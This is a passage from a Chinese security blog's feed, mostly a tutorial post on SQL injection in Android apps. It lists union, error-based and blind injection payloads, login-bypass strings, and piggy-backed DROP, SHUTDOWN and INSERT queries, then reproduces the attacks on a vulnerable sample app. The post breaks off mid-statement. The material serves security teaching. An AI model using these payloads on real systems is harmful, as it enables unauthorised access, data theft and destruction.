class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sina.com.cn/s/blog_4c3591bd0100zzm6.html</span><br><span class="line">https://thismj.cn/2019/02/14/qian-xi-zip-ge-shi/</span><br></pre></td></tr></table></figure><p>Android APK签名机制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://jishuin.proginn.com/p/763bfbd56b8b</span><br><span class="line">https://www.jianshu.com/p/286d2b372334</span><br><span class="line">https://xuanxuanblingbling.github.io/ctf/android/2018/12/30/signature/</span><br></pre></td></tr></table></figure><p>插件化漏洞原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/goodhacker/p/5152952.html</span><br><span class="line">https://wooyun.js.org/drops/APK%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87.html</span><br><span class="line">https://www.freebuf.com/articles/network/273466.html</span><br><span class="line">https://www.jianshu.com/p/14719d3a508f</span><br><span class="line">https://fiissh.tech/2021/android-fix-zip-path-traversal-vulnerability.html</span><br></pre></td></tr></table></figure><p>Janus漏洞原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://bbs.pediy.com/thread-223539.htm</span><br><span class="line">https://github.com/tea9/CVE-2017-13156-Janus</span><br><span class="line">https://cert.360.cn/warning/detail?id=d5a609929388cfd84c7e9aa8fb943265</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;最近一直处于忙碌的状态，花了很长一段时间，抽出碎片时间才将这篇帖子写完，本文结合上文的动态加载文章一起学习，本文主要讲述Android中存在的插件化漏洞、签名机制漏洞、解压缩漏洞等，并对一些经典的漏洞进行了复现，本文的相关实验文件由于太多，后面都会上传到知识星球&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（18）——Sql漏洞初探</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0018/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0018/</id>
    <published>2023-02-14T01:06:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近一直很忙碌，即将进入本系列文章基础篇的最后几个篇章，本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。</p><span id="more"></span><p>本文结构如下：</p><p>第二节讲述SQL注入的基本原理</p><p>第三节讲述常见的SQL注入漏洞并复现</p><p>第四节讲述Content Provider上的sql注入漏洞</p><p>第五节讲述DownProvider 上的sql注入漏洞</p><h2 id="二、SQL漏洞原理介绍"><a href="#二、SQL漏洞原理介绍" class="headerlink" title="二、SQL漏洞原理介绍"></a>二、SQL漏洞原理介绍</h2><h3 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1.SQL注入原理"></a>1.SQL注入原理</h3><p>通过实施 SQL 注入，攻击者可以获得对应用程序或数据库的完全访问权限，从而可以不负责任地删除或更改重要数据。未正确验证用户输入的应用程序使它们容易受到 SQL 注入的攻击。 SQL 注入攻击 (SQLIA) 发生在攻击者能够通过操纵用户输入数据将一系列恶意 SQL 语句插入“查询”以供后端数据库执行时。使用这种类型的威胁，应用程序可以很容易地被黑客入侵并被攻击者窃取机密数据。</p><p>SQL攻击的原理图如下所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/0.png" alt="image-20220707092239296"></p><p>上图中攻击者将 SQL 语句添加到应用程序表单输入框中，以访问资源或更改存储在数据库中的数据。应用程序中缺少输入验证会导致攻击者成功。在 SQL 注入攻击中，攻击者通过应用程序注入字符串输入，从而改变或操纵 SQL 语句以使攻击者受益。</p><h3 id="2-SQL注入分类"><a href="#2-SQL注入分类" class="headerlink" title="2.SQL注入分类"></a>2.SQL注入分类</h3><p>要学习SQL注入在Android上的使用，首先需要了解SQL注入的种类，SQL注入一般分为两种情况：<code>有回显和无回显</code>，有回显是指SQL语句返回的内容有显示在页面中；无回显是页面输出的内容并不是SQL语句返回的内容，而是“真”和“假”。</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/1.png" alt="image-20220707093229055"></p><h4 id="（1）联合查询注入"><a href="#（1）联合查询注入" class="headerlink" title="（1）联合查询注入"></a>（1）联合查询注入</h4><p>联合查询注入是在原有的查询条件下，通过union拼接上select语句，union可以用于合并两个和多个select语句的结果集</p><p>当union之前的select语句结果集为空时，查询结果将由union后的select语句控制。</p><p>联合查询语句构造步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.order by判断原有查询语句的列数</span><br><span class="line">2.使原有查询语句的结果为空</span><br><span class="line">3.判断数据输出位置</span><br><span class="line">4.使用union语句拼接目标数据的查询语句</span><br></pre></td></tr></table></figure><p>对于页面有回显，通常使用联合查询注入，可以快速爆出数据</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">order by <span class="comment">//确定列数</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">//显示回显位</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,database(),user() <span class="comment">//通过回显位爆出内容</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) from information_schema.schemata <span class="comment">//爆库</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() <span class="comment">//爆表</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;表名&#x27;</span> and table_schema=database() <span class="comment">//爆列</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(列名) from 表名 <span class="comment">//爆值</span></span><br></pre></td></tr></table></figure><h4 id="（2）报错注入"><a href="#（2）报错注入" class="headerlink" title="（2）报错注入"></a>（2）报错注入</h4><p>报错注入经过构造的函数，让函数处理<code>user()</code>等不合规定的数据，引发mysql报错；几乎任何与数据库有关的操作经过sql拼接都可以产生报错注入；当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容</p><p>构造报错注入的语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>构造目标数据查询语句</span><br><span class="line"><span class="number">2.</span>选择报错注入函数</span><br><span class="line"><span class="number">3.</span>构造报错注入语句</span><br><span class="line"><span class="number">4.</span>拼接报错注入语句</span><br><span class="line">常见的报错注入函数：floor()、extractvalue()、updatexml()等</span><br></pre></td></tr></table></figure><p>报错注入一般使用在查询不回显数据，但会打印错误信息的页面中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select <span class="title function_">user</span><span class="params">()</span>),<span class="number">0x7e</span>)) <span class="comment">//extractvalue报错将输出的字符长度限制为32位</span></span><br><span class="line"></span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select <span class="title function_">database</span><span class="params">()</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">//updatexml报错将输出的字符长度限制为32位</span></span><br><span class="line"></span><br><span class="line">select <span class="title function_">count</span><span class="params">(\*)</span> from information_schema.tables GROUP BY <span class="title function_">concat</span><span class="params">((select database()</span>),floor(rand(<span class="number">0</span>)\*<span class="number">2</span>)) <span class="comment">//floor报错将输出字符长度限制为64个字符</span></span><br></pre></td></tr></table></figure><h4 id="（3）布尔盲注"><a href="#（3）布尔盲注" class="headerlink" title="（3）布尔盲注"></a>（3）布尔盲注</h4><p>布尔盲注以页面回显内容的不同作为判定依据，通过构造语句返回页面的“真”和“假”来判断数据库信息的正确性</p><p>布尔盲注提取数据的基本步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>构造目标数据查询语句</span><br><span class="line"><span class="number">2.</span>选择拼接方式</span><br><span class="line"><span class="number">3.</span>构造判断表达式</span><br><span class="line"><span class="number">4.</span>提取数据长度</span><br><span class="line"><span class="number">5.</span>提取数据内容</span><br><span class="line">常见的拼接方式：原始条件真 and 判断条件真，原始条件假 or 判断条件真等</span><br></pre></td></tr></table></figure><p>若网页设置了无报错信息返回，在不回显数据+不返回报错信息的情况下，只剩下盲注方法可用，而布尔盲注使用在对真&#x2F;假条件的返回内容很容易区分的页面中。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">length(database()) <span class="comment">//判断数据库名长度</span></span><br><span class="line"></span><br><span class="line">ascii(substr((database()),s,<span class="number">1</span>))=可用ASCII码值 <span class="comment">//从数据库库名第s位开始，截取一位，进行逐一猜解；数据库库、表、字段所有名称的可用字符范围为A-Z、a-z、0-9和下划线，也就是ASCII码值从48到122</span></span><br><span class="line"></span><br><span class="line">length((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>)) <span class="comment">//判断数据库中的第4个表表名长度，第1个表从0开始</span></span><br><span class="line"></span><br><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>),s,<span class="number">1</span>))=可用ASCII码值 <span class="comment">//逐一猜解第4个表的表名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//之后逐一猜解列名与数据</span></span><br></pre></td></tr></table></figure><h4 id="（4）时间盲注"><a href="#（4）时间盲注" class="headerlink" title="（4）时间盲注"></a>（4）时间盲注</h4><p>时间盲注通过构造语句，通过页面响应的时长来判断信息；时间盲注的关键点在于if()函数，通过条件语句进行判断，为真则立即执行，否则延时执行，通常使用sleep()等专用的延时函数来进行延时操作</p><p>时间盲注与布尔盲注的语句构造过程相似，通常在布尔盲注表达式的基础上使用if函数加入延时语句来构造。通常情况下，盲注需要逐个字符进行判断，极大增加了时间成本，而对于时间盲注来说，还需要额外的延迟时间来作为判断的标准</p><p>在布尔盲注永假条件所返回的内容与正常语句返回的内容很接近或相同，无法判断的情况下，可使用时间盲注</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sleep() <span class="comment">//使用延时函数进行判断</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(length(database())=数字,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//if()函数判断数据库长度，if(Condition,A,B)，当Condition为true时返回A，当Condition为false时返回B</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ascii(substr(database(),s,<span class="number">1</span>))=可用ASCII码值,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//使用if函数，从第S位开始截取一位，逐一猜解数据库名，可用ASCII码值范围为48-122</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(length(select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>)=数字,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//逐一猜解数据库第4个表长度，第1个表从0开始</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>),s,<span class="number">1</span>))=可用ASCII码值,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//逐一猜解数据库第4个表表名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//逐一猜解列名、数据</span></span><br></pre></td></tr></table></figure><p>SQL注入的常见分类如上所述，由于本文主要针对Android上SQL注入讲解，这里就不再深入研究，这里引用博客：<a href="https://www.modb.pro/db/163732">SQL注入漏洞分析</a>，要深入了解朋友可以看原作者博客，里面还有一些案例讲解。</p><h3 id="3-SQL常见注入技巧"><a href="#3-SQL常见注入技巧" class="headerlink" title="3.SQL常见注入技巧"></a>3.SQL常见注入技巧</h3><p>前面我们已经了解了SQL注入的基本分类，下面我们介绍一些SQL注入实际的测试技巧：</p><h4 id="（1）重言式攻击"><a href="#（1）重言式攻击" class="headerlink" title="（1）重言式攻击"></a>（1）重言式攻击</h4><p>重言式攻击通过一个或多个条件SQL语句查询注入代码，使SQL命令计算为真条件，如(1&#x3D;1)或（–）。一般可以用来绕过身份验证</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from table <span class="type">where</span> <span class="variable">table_ID</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> or <span class="string">&#x27;1=1&#x27;</span>--<span class="string">&#x27;AND table_password=&#x27;</span><span class="number">1234</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><h4 id="（2）Piggy-backed查询"><a href="#（2）Piggy-backed查询" class="headerlink" title="（2）Piggy-backed查询"></a>（2）Piggy-backed查询</h4><p>Piggy-backed Queries是一种攻击，它使用查询分隔符（如“；”）向原始查询注入额外的查询语句，从而危及数据库。 在这种方法中，第一个查询是原始的，而随后的查询是注入的。 这次攻击是非常危险的</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT pass FROM userTable WHEREuser_ld=<span class="string">&#x27;user1&quot; AND Password = 0; drop userTable</span></span><br></pre></td></tr></table></figure><h4 id="（3）逻辑错误"><a href="#（3）逻辑错误" class="headerlink" title="（3）逻辑错误"></a>（3）逻辑错误</h4><p>逻辑错误攻击利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM userTable WHEREuser_ld=’<span class="number">1111</span>’ AND password=<span class="string">&#x27;1234’ AND CONVERT(char, no)</span></span><br></pre></td></tr></table></figure><h4 id="（4）联合查询"><a href="#（4）联合查询" class="headerlink" title="（4）联合查询"></a>（4）联合查询</h4><p>联合查询注入称为语句注入攻击。 在此攻击中，攻击者在原始SQL语句中插入附加语句。 此攻击可以通过在Vulnerable参数中插入UNION查询或“；<SQL Statement>”形式的语句来完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT* FROM userTable WHEREuser_ld=<span class="number">1111</span><span class="string">&#x27;UNION SELECT *FROMmemberTable WHERE member_ld=&#x27;</span>admin<span class="string">&#x27;--&#x27;</span> AND password=<span class="string">&#x27;1234&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="（5）存储过程"><a href="#（5）存储过程" class="headerlink" title="（5）存储过程"></a>（5）存储过程</h4><p>在该技术中，攻击者主要关注数据库系统中存在的存储过程。 存储过程直接由数据库引擎运行。 它是一段可利用的代码。 存储过程为授权或未经授权的客户端提供true或false值。 对于SQLIA，攻击者将写入“； 关机； –“使用登录名或密钥。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Username FROM UserTableWHEREuser_name= <span class="string">&quot;user1&quot;</span> AND pass=<span class="string">&quot; &quot;</span>; SHUTDOWN;</span><br></pre></td></tr></table></figure><h4 id="（6）推断攻击"><a href="#（6）推断攻击" class="headerlink" title="（6）推断攻击"></a>（6）推断攻击</h4><p>利用推断攻击，攻击者可以改变数据库或应用程序的行为。 这种类型的攻击可以分为两种著名的技术，它们是：盲注入和定时攻击</p><h5 id="lt-1-gt-盲注入"><a href="#lt-1-gt-盲注入" class="headerlink" title="&lt;1&gt;盲注入"></a>&lt;1&gt;盲注入</h5><p>当程序员忘记隐藏导致数据库应用程序不安全的错误消息时，就会发生这种类型的SQLIA，这种错误消息通过SQL语句询问一系列逻辑问题来帮助SQLIA危及数据库。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT pass FROM userTable WHERE username=<span class="string">&#x27;user&#x27;</span> and <span class="number">1</span> =<span class="number">0</span> -- <span class="type">AND</span> <span class="variable">pass</span> <span class="operator">=</span> AND pin= <span class="number">0</span></span><br><span class="line">SELECT info FROM userTable WHERE username=<span class="string">&#x27;user&#x27;</span> and = <span class="number">1</span> -- <span class="type">AND</span> <span class="variable">pass</span> <span class="operator">=</span> AND pass= <span class="number">0</span></span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-定时攻击"><a href="#lt-2-gt-定时攻击" class="headerlink" title="&lt;2&gt;定时攻击"></a>&lt;2&gt;定时攻击</h5><p>这种类型的攻击允许攻击者通过观察数据库响应中的定时延迟来从数据库中收集信息。 这类攻击利用if条件语句来达到延时的目的。 WAITFOR是分支上的关键字，它导致数据库将其响应延迟指定的时间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @ varchar (<span class="number">8000</span>) select <span class="meta">@s</span> =db_name (<span class="keyword">if</span> (ascii (substring (<span class="meta">@s</span>,<span class="number">1</span>,<span class="number">1</span>))&amp;(power (<span class="number">2</span>,o) &gt; o waitfor delay <span class="string">&#x27;0:0:5&quot;</span></span><br></pre></td></tr></table></figure><h4 id="（7）交替编码"><a href="#（7）交替编码" class="headerlink" title="（7）交替编码"></a>（7）交替编码</h4><p>当攻击者通过使用替代编码（如十六进制、ASCII和Unicode）修改注入查询时，就会发生此类攻击。 通过这种方式，攻击者可以逃离开发人员的过滤器，该过滤器扫描输入查询以查找特定的已知“坏字符”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT accounts FROM userTable WHERE login=<span class="string">&quot;AND pin=0; exec (char(0x73687574646f776e)</span></span><br></pre></td></tr></table></figure><h3 id="4-Andorid-APP-SQL漏洞常见的测试点"><a href="#4-Andorid-APP-SQL漏洞常见的测试点" class="headerlink" title="4.Andorid APP SQL漏洞常见的测试点"></a>4.Andorid APP SQL漏洞常见的测试点</h3><p>Android APP SQL注入漏洞一般位于APP的用户登录，充值页面，修改银行卡，提交留言反馈，商品购买，提现功能等地方</p><h2 id="三、常见的SQL漏洞"><a href="#三、常见的SQL漏洞" class="headerlink" title="三、常见的SQL漏洞"></a>三、常见的SQL漏洞</h2><p>这里我们使用一个漏洞样本来详细的讲解APP SQL注入漏洞的情况</p><h3 id="1-重言式攻击"><a href="#1-重言式攻击" class="headerlink" title="1.重言式攻击"></a>1.重言式攻击</h3><h4 id="（1）漏洞原理"><a href="#（1）漏洞原理" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>我们前面讲了，可以使用<code>(1=1)或（--）</code>来绕过身份验证，我们知道一般SQL语句登录构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * From 用户表 Where UserName=xxx and Password=xxx</span><br></pre></td></tr></table></figure><p>然后判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功，而这样的语句的话</p><p>那么我们可以在登录账户或密码后面加上<code>（1=1）</code>，因为1&#x3D;1登录条件永远成立，而<code>--</code>作为内嵌评论的开始字符，会导致后面内容只作为评论，这样就可以不去验证密码的有效性</p><h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>我们打开应用</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/2.png" alt="image-20220710153441324"></p><p>这里很显然是一个登录界面，APP会通过用户输入的账号和密码，去查询数据库中用户进行匹配，我们进一步进行静态分析</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/3.png" alt="image-20220710153652015"></p><p>不难找到这句语句是APP进行数据库查询的语句，我们可以进行进一步分析</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/4.png" alt="image-20220710153916860"></p><p>不难发现这里我们如果在不知道密码情况下，随意输入，APP会根据账号和密码构造一个有效的负载来避免检测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; WHERE NAME=&#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span> &quot;&#x27; AND PASSWORD=&#x27;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure><p>因此我们可以使用<code>（1=1）</code>和<code>--</code>两种方式来进行sql注入绕过验证</p><p><code>--</code></p><p>我们使用<code>--</code>来构造语句，无非是使得不会去检测密码的有效性，所以我们可以构造语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span> <span class="comment">-- AND PASSWORD = &#x27;xyz&#x27;</span></span><br></pre></td></tr></table></figure><p>这样会是的我们将查询语句构造成上面语句，APP就不会去验证密码，而我们又输入的是管理员账号，所以可以尝试进行sql注入绕过</p><p>构造账号和密钥：账号<code>Admin&#39; --</code> 密钥：<code>Anything</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/5.png" alt="image-20220710154643896"></p><p>这样就成功的绕过了验证，获得具体信息</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/6.png" alt="image-20220710154806710"></p><p>我们还可以查询账号密钥相应的详细</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/7.png" alt="image-20220710154852745"></p><p>同理我们使用（1&#x3D;1）方式来进行注入</p><p><code>1=1</code></p><p>我们使用<code>1=1</code>来进行注入，无非是相在输入账户情况下，可以输入任意的密码，这样我们只需要使用(OR <code>&#39;1&#39;=&#39;1&#39;</code>)即可</p><p>可以构造SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> PASSWORD <span class="operator">=</span> <span class="string">&#x27;anything&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>构造账号和密钥：账号：<code>Admin&#39; OR &#39;1&#39;=&#39;1</code> 密钥：<code>anything&#39; OR &#39;1&#39;=&#39;1</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/8.png" alt="image-20220710155537289"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/9.png" alt="image-20220710155557758"></p><p>同理成功进入 上面账号和密码可以为任意值</p><h3 id="2-Piggy-backed查询"><a href="#2-Piggy-backed查询" class="headerlink" title="2.Piggy-backed查询"></a>2.Piggy-backed查询</h3><h4 id="（1）漏洞原理-1"><a href="#（1）漏洞原理-1" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>我们上面已经简单的绕过了该攻击，我们可以使用<code>;</code>来进行Piggy-backed查询，这样可以使得在登录系统的同时，再进行执行一条SQL语句</p><h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>我们可以构造SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;anyname&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee (NAME, ID) <span class="keyword">VALUES</span> (<span class="string">&#x27;MUR&#x27;</span>,<span class="string">&#x27;11451&#x27;</span>) <span class="comment">-- AND PASSWORD = &#x27;anything&#x27;</span></span><br></pre></td></tr></table></figure><p>上面的语句实现三个功能：构造任意的用户名，插入新的sql语句，使得验证码无效</p><p>构造用户名和密码：用户名：<code>anyname&#39; OR &#39;1&#39;=&#39;1&#39;; INSERT INTO employee (NAME, ID) VALUES (&#39;MUR&#39;,&#39;11451&#39;) --</code> 密码：<code>anything</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/10.png" alt="image-20220710161338483"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/11.png" alt="image-20220710161653071"></p><p>这里我们发现成功的登录，但是并没有插入用户名成功，经过分析，在大多数<a href="https://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html#execSQL(java.lang.String)">SQLiteDatabase API</a>中<code>;</code>被定义为终止，所以它之后的任何内容都应该被忽略，但是这也是在一些APP中可以进行测试的环节，当我们理解<code>;</code>作用后，很明显我们又可以得到一种绕过登录的方法，这里既然<code>;</code>后面都无效，是不是意味，我们只要输入正确账户，就可以登录</p><p>构造SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span>;  <span class="keyword">AND</span> PASSWORD <span class="operator">=</span> <span class="string">&#x27;anything&#x27;</span></span><br></pre></td></tr></table></figure><p>构造账号和密码：账号<code>Admin&#39;;</code>，密码：<code>Anything</code> </p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/12.png" alt="image-20220710162127368"></p><p>同样成功登录</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/13.png" alt="image-20220710162156625"></p><h3 id="3-逻辑错误攻击"><a href="#3-逻辑错误攻击" class="headerlink" title="3.逻辑错误攻击"></a>3.逻辑错误攻击</h3><h4 id="（1）漏洞原理-2"><a href="#（1）漏洞原理-2" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>原本逻辑错误攻击是利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。而我们这里发现在数据字段校验时，通过插入多余的字段，来实现越权的功能</p><h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>这里我们分析到数据库更新的语句</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/14.png" alt="image-20220710163213985"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/15.png" alt="image-20220710163233575"></p><p>通过这里的更新语句我们可以很明显的得到构造的SQL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., 